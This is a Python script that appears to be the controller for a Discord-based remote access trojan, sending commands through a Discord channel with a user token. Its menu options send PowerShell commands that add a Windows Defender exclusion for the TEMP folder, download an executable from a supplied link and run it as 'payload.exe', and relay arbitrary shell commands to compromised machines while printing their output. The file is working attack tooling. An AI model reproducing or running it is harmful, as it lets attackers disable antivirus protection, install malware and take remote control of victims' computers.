from banner import *
import requests
import os

channel_id = "channel_id_here"
token = "discord_token_here"

def send_message(content,channel_id):

    requests.post("https://discord.com/api/v9/channels/"+channel_id+"/messages"
                  
    ,headers={"authorization":token},

    json={"content":"!s:"+content})

def get_message(channel_id):
    
    result = requests.get("https://discord.com/api/v9/channels/" + channel_id + "/messages?limit=1",
    headers={"authorization":token})

    return result.json()[0]["content"]


def main():
    while True:
        os.system("cls")
        show_banner()

        choice = Write.Input("Enter Your Choice (1,3)-> ", Colors.purple_to_blue, interval=0.0025)

        match choice:
                case "1":
                    send_message('powershell -Command Add-MpPreference -ExclusionPath "%TEMP%"',channel_id)
                case "2":

                    link = Write.Input("Enter Your Link -> ", Colors.purple, interval=0.0025)
                    send_message(rf'''powershell -Command "Add-MpPreference -ExclusionPath $env:TEMP; (New-Object System.Net.WebClient).DownloadFile('{link}', (Join-Path $env:TEMP 'payload.exe')); Start-Process (Join-Path $env:TEMP 'payload.exe')"''',channel_id)
                    pass
                case "3":
                    while True:
                        os.system("cls")
                        showbanner_raw()
                        choice = Write.Input("C0MM4ND : ", Colors.purple_to_blue, interval=0.0025)
                        send_message(choice,channel_id)
                        while True:
                            result = get_message(channel_id)
                            if str(result).startswith("!s") == True:
                                pass
                            else:
                                print(result)
                                input()
                                break
                            



if __name__ == "__main__":
    main()
    